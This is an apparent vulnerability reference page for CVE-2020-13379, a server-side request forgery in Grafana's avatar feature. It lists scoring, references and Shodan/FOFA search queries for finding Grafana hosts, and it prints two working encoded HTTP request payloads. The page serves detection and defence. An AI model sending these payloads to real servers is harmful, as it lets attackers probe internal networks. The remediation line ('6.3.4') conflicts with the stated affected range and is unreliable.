---
layout: post
cve_id: CVE-2020-13379
title: Grafana 3.0.1-7.0.1 - Server-Side Request Forgery
pcap: true
pcap_path: /pcaps/2020/CVE-2020-13379.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-13379.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Joshua Rogers
severity: high
impact: 'An attacker can exploit this vulnerability to bypass security controls, access
  internal resources, and potentially perform further attacks.

  '
remediation: Upgrade to 6.3.4 or higher.
reference:
- https://github.com/advisories/GHSA-wc9w-wvq2-ffm9
- https://github.com/grafana/grafana/commit/ba953be95f0302c2ea80d23f1e5f2c1847365192
- http://www.openwall.com/lists/oss-security/2020/06/03/4
- https://nvd.nist.gov/vuln/detail/CVE-2020-13379
- http://lists.opensuse.org/opensuse-security-announce/2020-06/msg00060.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H
  cvss-score: 8.2
  cve-id: CVE-2020-13379
  cwe-id: CWE-918
  epss-score: 0.93254
  epss-percentile: 0.99789
  cpe: cpe:2.3:a:grafana:grafana:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: grafana
  product: grafana
  shodan-query:
  - title:"Grafana"
  - cpe:"cpe:2.3:a:grafana:grafana"
  - http.title:"grafana"
  fofa-query:
  - title="grafana"
  - app="grafana"
  google-query: intitle:"grafana"
tags:
- cve2020
- cve
- grafana
- ssrf
- vkev
- vuln
---

## üîç Vulnerability Description
Grafana 3.0.1 through 7.0.1 is susceptible to server-side request forgery via the avatar feature, which can lead to remote code execution. Any unauthenticated user/client can make Grafana send HTTP requests to any URL and return its result. This can be used to gain information about the network Grafana is running on, thereby potentially enabling an attacker to obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.


## üåê HTTP Request
```nohighlight
GET /avatar/1%3fd%3dhttp%3A%252F%252Fimgur.com%252F..%25252F1.1.1.1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.7 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /grafana/avatar/1%3fd%3dhttp%3A%252F%252Fimgur.com%252F..%25252F1.1.1.1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

